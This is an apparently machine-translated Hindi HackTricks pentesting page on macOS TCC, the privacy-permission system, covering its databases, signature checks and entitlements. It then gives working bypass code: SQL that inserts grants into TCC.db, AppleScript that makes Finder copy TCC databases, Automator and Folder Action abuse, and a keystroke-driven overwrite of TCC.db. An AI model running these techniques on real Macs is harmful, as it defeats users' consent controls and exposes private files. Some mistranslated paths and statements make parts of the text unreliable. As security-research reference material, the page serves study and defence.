# macOS TCC

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## **मूल जानकारी**

**TCC (Transparency, Consent, and Control)** एक सुरक्षा प्रोटोकॉल है जो एप्लिकेशन अनुमतियों को नियंत्रित करने पर ध्यान केंद्रित करता है। इसकी प्राथमिक भूमिका है **स्थान सेवाएं, संपर्क, फोटो, माइक्रोफोन, कैमरा, पहुंचनीयता और पूर्ण डिस्क एक्सेस** जैसी संवेदनशील विशेषताओं की रक्षा करना। TCC उन्हें विशेष उपयोगकर्ता सहमति प्रदान करने से पहले एप्लिकेशन को इन तत्वों तक पहुंचने की अनुमति देने के माध्यम से, गोपनीयता और उपयोगकर्ता के डेटा पर नियंत्रण को बढ़ाता है।

उपयोगकर्ताओं को TCC का सामना तब होता है जब एप्लिकेशन संरक्षित विशेषताओं तक पहुंच का अनुरोध करते हैं। यह एक प्रॉम्प्ट के माध्यम से दिखाई देता है जो उपयोगकर्ताओं को **पहुंच को स्वीकृत या अस्वीकृत** करने की अनुमति देता है। इसके अतिरिक्त, TCC निर्देशित उपयोगकर्ता क्रियाएँ भी समेत है, जैसे कि **फ़ाइलों को एक एप्लिकेशन में खींचना और छोड़ना**, विशिष्ट फ़ाइलों तक पहुंच प्रदान करने के लिए, यह सुनिश्चित करता है कि एप्लिकेशन केवल उसे जो स्पष्ट रूप से परमिट किया गया है, तक ही पहुंच है।

![एक TCC प्रॉम्प्ट का उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** को **डेमन्ड** द्वारा संभाला जाता है जो `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित है और `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में विन्यासित किया गया है (mach सेवा `com.apple.tccd.system` को पंजीकृत करना).

`/System/Library/LaunchAgents/com.apple.tccd.plist` में परिभाषित प्रत्येक लॉग इन उपयोगकर्ता के लिए **उपयोगकर्ता-मोड tccd** चल रहा है जो mach सेवाएं `com.apple.tccd` और `com.apple.usernotifications.delegate.com.apple.tccd` को पंजीकृत कर रहा है।

यहाँ आप सिस्टम और उपयोगकर्ता के रूप में tccd को देख सकते हैं:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
अनुमतियाँ **मूल एप्लिकेशन से विरासत में मिलती हैं** और **अनुमतियाँ** **बंडल आईडी** और **डेवलपर आईडी** के आधार पर **ट्रैक की जाती हैं**।

### TCC डेटाबेस

अनुमतियाँ/इनकार फिर **कुछ TCC डेटाबेस में संग्रहित** होती हैं:

* **`/Library/Application Support/com.apple.TCC/TCC.db`** में सिस्टम-व्यापी डेटाबेस।
* यह डेटाबेस **SIP सुरक्षित** है, इसलिए केवल SIP बाईपास इसमें लिख सकता है।
* प्रति-उपयोगकर्ता पसंदों के लिए उपयोगकर्ता TCC डेटाबेस **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**।
* यह डेटाबेस सुरक्षित है, इसलिए केवल पूर्ण डिस्क एक्सेस जैसी उच्च TCC विशेषाधिकारों वाले प्रक्रियाएँ इसमें लिख सकती हैं (लेकिन यह SIP द्वारा संरक्षित नहीं है)।

{% hint style="warning" %}
पिछले डेटाबेस भी **पढ़ने के लिए TCC सुरक्षित हैं**। इसलिए आप **अपने सामान्य उपयोगकर्ता TCC डेटाबेस को पढ़ नहीं पाएंगे** जब तक यह TCC विशेषाधिकार वाली प्रक्रिया से न हो।

हालांकि, ध्यान रखें कि इन उच्च विशेषाधिकारों वाली प्रक्रियाओं (जैसे **FDA** या **`kTCCServiceEndpointSecurityClient`**) के साथ एक प्रक्रिया उपयोगकर्ता TCC डेटाबेस में लिख सकेगी।
{% endhint %}

* **तीसरा** TCC डेटाबेस **`/var/db/locationd/clients.plist`** में है जो स्थान सेवाओं तक पहुंचने की अनुमति देने वाले ग्राहकों को दर्शाता है।
* SIP सुरक्षित फ़ाइल **`/Users/carlospolop/Downloads/REG.db`** (जिसे TCC के साथ पढ़ने की भी सुरक्षा है) में सभी मान्य TCC डेटाबेसों का **स्थान** है।
* SIP सुरक्षित फ़ाइल **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (जिसे TCC के साथ पढ़ने की भी सुरक्षा है) में अधिक TCC दी गई अनुमतियाँ हैं।
* SIP सुरक्षित फ़ाइल **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (किसी भी व्यक्ति द्वारा पढ़ा जा सकता है) एक ऐसी एप्लिकेशनों की अनुमति की सूची है जिन्हें TCC अपवाद की आवश्यकता है।

{% hint style="success" %}
**iOS** में TCC डेटाबेस **`/private/var/mobile/Library/TCC/TCC.db`** में है।
{% endhint %}

{% hint style="info" %}
**सूचना केंद्र UI** सिस्टम TCC डेटाबेस में **परिवर्तन कर सकता है**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

हालांकि, उपयोगकर्ता **`tccutil`** कमांड लाइन यूटिलिटी के साथ **नियमों को हटाने या क्वेरी करने** की अनुमति है।
{% endhint %}

#### डेटाबेस क्वेरी करें

{% tabs %}
{% tab title="उपयोगकर्ता डेटाबेस" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="सिस्टम डीबी" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
दोनों डेटाबेस की जाँच करके आप देख सकते हैं कि किसी ऐप्लिकेशन ने कौन सी अनुमतियाँ स्वीकृत की हैं, किसे निषेधित किया गया है, या जिसकी अनुमति नहीं है (यह अनुमति के लिए पूछेगा)।
{% endhint %}

* **`सेवा`** TCC **अनुमति** स्ट्रिंग प्रतिनिधित्व है
* **`ग्राहक`** **बंडल आईडी** या **बाइनरी का पथ** है जिसके पास अनुमतियाँ हैं
* **`ग्राहक प्रकार`** यह दर्शाता है कि यह बंडल पहचानकर्ता(0) है या एक पूर्ण पथ(1)

<details>

<summary>अगर यह एक पूर्ण पथ है तो कैसे निष्पादित करें</summary>

बस **`launctl load you_bin.plist`** करें, जैसे कि एक प्लिस्ट फ़ाइल के साथ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** कई अलग-अलग मान रख सकता है: denied(0), unknown(1), allowed(2), या limited(3).
* **`auth_reason`** निम्नलिखित मान ले सकता है: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** फ़ील्ड यह दर्शाता है कि कैसे बाइनरी की सत्यापन करें और TCC अनुमतियाँ प्रदान करें:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* तालिका के **अन्य क्षेत्रों** के बारे में अधिक जानकारी के लिए [**इस ब्लॉग पोस्ट**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive) की जाँच करें।

आप **पहले से दी गई अनुमतियों** की जाँच भी कर सकते हैं `सिस्टम प्राथमिकताएँ --> सुरक्षा और गोपनीयता --> गोपनीयता --> फ़ाइल और फ़ोल्डर्स` में।

{% hint style="success" %}
उपयोगकर्ता **`tccutil`** का उपयोग करके **नियमों को हटा सकते या क्वेरी कर सकते हैं**।
{% endhint %}

#### TCC अनुमतियों को रीसेट करें
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC हस्ताक्षर जांच

TCC **डेटाबेस** एप्लिकेशन का **बंडल आईडी** स्टोर करता है, लेकिन यह भी **हस्ताक्षर** के बारे में **जानकारी** स्टोर करता है ताकि यह सुनिश्चित कर सके कि अनुमति का उपयोग करने के लिए अप्लिकेशन सही है।
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
इसलिए, अन्य एप्लिकेशन जो एक ही नाम और बंडल आईडी का उपयोग कर रहे हैं, वे अन्य ऐप्स को दी गई अनुमतियों तक पहुंच नहीं पा सकेंगे।
{% endhint %}

### अधिकार और TCC अनुमतियाँ

ऐप्स को केवल कुछ संसाधनों तक पहुंचने के लिए नहीं मांगने की आवश्यकता है, उन्हें उन संसाधनों तक पहुंचने की अनुमति भी मिलनी चाहिए।\
उदाहरण के लिए **Telegram** के पास `com.apple.security.device.camera` नामक अधिकार है जिससे **कैमरे तक पहुंच** के लिए अनुरोध किया जा सकता है। एक एप्लिकेशन जिसके पास यह अधिकार नहीं है, वह कैमरे तक पहुंच नहीं पाएगा (और उपयोगकर्ता से अनुमतियों के लिए भी पूछा नहीं जाएगा)।

हालांकि, ऐप्स को `~/Desktop`, `~/Downloads` और `~/Documents` जैसे कुछ उपयोगकर्ता फोल्डरों तक पहुंचने के लिए किसी विशेष अधिकार की आवश्यकता नहीं है। सिस्टम स्वचालित रूप से पहुंच को संभालेगा और उपयोगकर्ता को जरूरत के अनुसार पूछेगा।

एप्पल की ऐप्स प्रॉम्प्ट नहीं उत्पन्न करेंगी। उनमें उनकी अधिकार सूची में पूर्व-मंजूर अधिकार होते हैं, जिसका मतलब है कि वे कभी भी एक पॉपअप उत्पन्न नहीं करेंगे, न तो वे किसी भी TCC डेटाबेस में दिखाई देंगे। उदाहरण:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
यह कैलेंडर से उपयोगकर्ता से अनुरोध करेगा कि यह यादें, कैलेंडर और पता-पुस्तिका तक पहुंचने की अनुमति न दें।

{% hint style="success" %}
कुछ आधिकारिक दस्तावेज़ के अलावा आप [https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl) में अनौपचारिक **अनुमतियों के बारे में दिलचस्प जानकारी** भी पा सकते हैं।
{% endhint %}

कुछ TCC अनुमतियाँ हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... इनमें से सभी की परिभाषित सूची नहीं है लेकिन आप इस [**जाने माने सूची**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) की जांच कर सकते हैं।

### संवेदनशील सुरक्षित स्थान

* $HOME (इसके अंदर)
* $HOME/.ssh, $HOME/.aws, आदि
* /tmp

### उपयोगकर्ता की इच्छा / com.apple.macl

पहले ही उल्लिखित की गई तरह, **एक ऐप को एक फ़ाइल तक पहुंचने की अनुमति देने के लिए उसे उसमें खींचकर ड्रॉप करना संभव है**। यह पहुंच तो किसी भी TCC डेटाबेस में निर्दिष्ट नहीं की जाएगी लेकिन यह फ़ाइल का **विस्तारित गुणवत्ता** होगा। यह गुणवत्ता अनुमति प्रदान करने वाले ऐप का **UUID संग्रहित करेगा**।
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
यह अजीब है कि **`com.apple.macl`** विशेषता **Sandbox** द्वारा प्रबंधित है, न कि tccd।

ध्यान दें कि यदि आप किसी फ़ाइल को अपने कंप्यूटर में किसी अन्य कंप्यूटर में ले जाते हैं जिसमें एक ऐप्लिकेशन का UUID है, क्योंकि वही ऐप विभिन्न UIDs होंगे, तो उस ऐप तक पहुंच नहीं देगा।
{% endhint %}

विस्तारित विशेषता `com.apple.macl` **ऐसे नहीं हटाई जा सकती** जैसे अन्य विस्तारित विशेषताएँ क्योंकि यह **SIP द्वारा संरक्षित है**। हालांकि, जैसा कि [**इस पोस्ट में स्पष्ट किया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), इसे अक्षम करना संभव है **फ़ाइल को ज़िप करके**, इसे **हटाकर** और इसे **अनज़िप** करके।

## TCC Privesc & Bypasses

### TCC में डालें

यदि किसी समय आपको TCC डेटाबेस पर लेखन अधिकार मिल जाते हैं तो आप निम्नलिखित तरह का कुछ इस्तेमाल कर सकते हैं एक प्रविष्टि जोड़ने के लिए (टिप्पणियाँ हटा दें):

<details>

<summary>उदाहरण में TCC में डालें</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC पेयलोड

यदि आपने किसी ऐप में TCC अनुमतियों के साथ अंदर जाने में कामयाबी प्राप्त की है, तो निम्नलिखित पृष्ठ की जाँच करें TCC पेयलोड को दुरुपयोग करने के लिए:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### स्वचालन (फाइंडर) से FDA\*

स्वचालन अनुमति का TCC नाम है: **`kTCCServiceAppleEvents`**\
यह विशेष TCC अनुमति भी इसका संकेत देती है **ऐप्लिकेशन जिसे TCC डेटाबेस के अंदर प्रबंधित किया जा सकता है** (ताकि अनुमतियाँ सब कुछ प्रबंधित करने की अनुमति न दें).

**फाइंडर** एक ऐप्लिकेशन है जिसमें **हमेशा FDA होता है** (यदि यह UI में नहीं दिखाई देता), इसलिए यदि आपके पास इस पर **स्वचालन** अनुमतियाँ हैं, तो आप इसकी अनुमतियों का दुरुपयोग करके इसे **कुछ क्रियाएँ करने के लिए मजबूर कर सकते हैं**.\
इस मामले में आपके ऐप्लिकेशन को **`com.apple.Finder`** पर **`kTCCServiceAppleEvents`** अनुमति की आवश्यकता होगी।

{% tabs %}
{% tab title="उपयोगकर्ताओं का TCC.db चुराएं" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="सिस्टम TCC.db चुराना" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

आप इसका दुरुपयोग कर सकते हैं ताकि **अपना खुद का उपयोगकर्ता TCC डेटाबेस** लिख सकें।

{% hint style="warning" %}
इस अनुमति के साथ आप **फाइंडर से TCC प्रतिबंधित फ़ोल्डर तक पहुंचने के लिए अनुरोध कर सकेंगे** और आपको फ़ाइलें देने के लिए, लेकिन जैसा मुझे पता है, आप **फाइंडर को विभिन्न कोड चलाने के लिए पूरी तरह से उसके FDA एक्सेस का दुरुपयोग नहीं कर सकेंगे**।

इसलिए, आप FDA की पूरी क्षमताओं का दुरुपयोग नहीं कर सकेंगे।
{% endhint %}

यह फाइंडर पर ऑटोमेशन विशेषाधिकार प्राप्त करने के लिए TCC प्रॉम्प्ट है:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
ध्यान दें कि **ऑटोमेटर** ऐप के पास TCC अनुमति **`kTCCServiceAppleEvents`** है, इससे वह **किसी भी ऐप को नियंत्रित कर सकता है**, जैसे कि फाइंडर। इसलिए, ऑटोमेटर को नियंत्रित करने की अनुमति होने पर आप नीचे दिए गए कोड की तरह **फाइंडर** को भी नियंत्रित कर सकते हैं:
{% endhint %}

<details>

<summary>ऑटोमेटर के अंदर एक शैल मिलाएं</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**स्क्रिप्ट संपादक ऐप** के साथ भी यही होता है, यह Finder को नियंत्रित कर सकता है, लेकिन एक AppleScript का उपयोग करके आप इसे स्क्रिप्ट को क्रियान्वित करने के लिए मजबूर नहीं कर सकते।

### ऑटोमेशन (SE) से कुछ TCC को

**सिस्टम इवेंट्स** फ़ोल्डर एक्शन बना सकते हैं, और फ़ोल्डर एक्शन कुछ TCC फ़ोल्डर तक पहुंच सकते हैं (डेस्कटॉप, दस्तावेज़ और डाउनलोड), इसलिए निम्नलिखित एक स्क्रिप्ट का उपयोग इस व्यवहार का दुरुपयोग करने के लिए किया जा सकता है:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### स्वचालन (SE) + पहुंचन (kTCCServicePostEvent|kTCCServiceAccessibility) को एफडीए\*

**`सिस्टम इवेंट्स`** पर स्वचालन + पहुंचन (**`kTCCServicePostEvent`**) के द्वारा **प्रक्रियाओं को कीबोर्ड की टाइपिंग** करने की अनुमति है। इस तरह आप Finder का दुरुपयोग करके उपयोगकर्ता TCC.db को बदल सकते हैं या किसी भी ऐप्लिकेशन को एफडीए दे सकते हैं (हालांकि इसके लिए पासवर्ड की मांग की जा सकती है)।

उपयोगकर्ता TCC.db को ओवरराइट करने वाला Finder उदाहरण:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` से FDA\* तक

एक्सेसिबिलिटी अनुमतियों का दुरुपयोग करने के लिए [**पेज देखें**](macos-tcc-payloads.md#accessibility) FDA\* तक प्राइवेस्क करने या उदाहरण के लिए एक कीलॉगर चलाने के लिए।

### **एंडपॉइंट सिक्योरिटी क्लाइंट से FDA**

अगर आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। समाप्त।

### सिस्टम पॉलिसी सिसएडमिन फ़ाइल से FDA

**`kTCCServiceSystemPolicySysAdminFiles`** एक उपयोगकर्ता के **`NFSHomeDirectory`** विशेषता को **बदलने** की अनुमति देता है जो उसके होम फ़ोल्डर को बदल देता है और इसलिए TCC को **छलना** देता है।

### उपयोगकर्ता TCC डेटाबेस से FDA

**उपयोगकर्ता TCC** डेटाबेस पर **लेखन अनुमतियाँ** प्राप्त करने के बाद आप खुद को **`FDA`** अनुमतियाँ नहीं दे सकते, केवल जो व्यक्ति सिस्टम डेटाबेस में रहता है वह दे सकता है।

लेकिन आप खुद को **`Finder के लिए ऑटोमेशन अधिकार`** दे सकते हैं, और FDA\* तक उन्नति के लिए पिछली तकनीक का दुरुपयोग कर सकते हैं।

### **FDA से TCC अनुमतियाँ**

**फुल डिस्क एक्सेस** TCC नाम है **`kTCCServiceSystemPolicyAllFiles`**

मुझे लगता है कि यह एक वास्तविक प्राइवेस्क नहीं है, लेकिन यदि आपके पास FDA है तो आप **उपयोगकर्ताओं के TCC डेटाबेस को संशोधित कर सकते हैं और खुद को किसी भी पहुंच दे सकते हैं**। यह एक स्थायित्व तकनीक के रूप में उपयोगी हो सकता है यदि आप अपनी FDA अनुमतियाँ खो दें।

### **SIP बायपास से TCC बायपास**

सिस्टम **TCC डेटाबेस** को **SIP** द्वारा सुरक्षित किया जाता है, इसलिए केवल प्रक्रियाएँ जिनमें **निर्दिष्ट अधिकार हैं** उसे संशोधित कर सकेंगी। इसलिए, यदि कोई हमलावर एक **SIP बायपास** खोजता है एक **फ़ाइल** पर (SIP द्वारा प्रतिबंधित फ़ाइल को संशोधित करने की क्षमता हो), तो वह कर सकेगा:

* एक TCC डेटाबेस की **सुरक्षा हटा सकता है**, और खुद को सभी TCC अनुमतियाँ दे सकता है। उसे उदाहरण के रूप में किसी भी इन फ़ाइलों का दुरुपयोग कर सकता है:
* TCC सिस्टम डेटाबेस
* REG.db
* MDMOverrides.plist

हालांकि, इस **SIP बायपास का दुरुपयोग TCC को बायपास करने के लिए** एक और विकल्प है, फ़ाइल `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` एक ऐसी अनुमति की सूची है जिसमें ऐप्लिकेशन्स को TCC अपवाद की आवश्यकता होती है। इसलिए, यदि कोई हमलावर इस फ़ाइल से SIP सुरक्षा हटा सकता है और अपना **अपना ऐप्लिकेशन जोड़ सकता है** तो ऐप्लिकेशन TCC को बायपास कर सकेगा।\
उदाहरण के लिए टर्मिनल जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
### AllowApplicationsList.plist:

यह फ़ाइल टीसीसी (TCC) डेटाबेस को बाहरी एप्लिकेशनों को एक्सेस करने की अनुमति देने के लिए उपयोग किए जाने वाले एप्लिकेशनों की सूची को संदर्भित करती है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC बायपास

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## संदर्भ

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
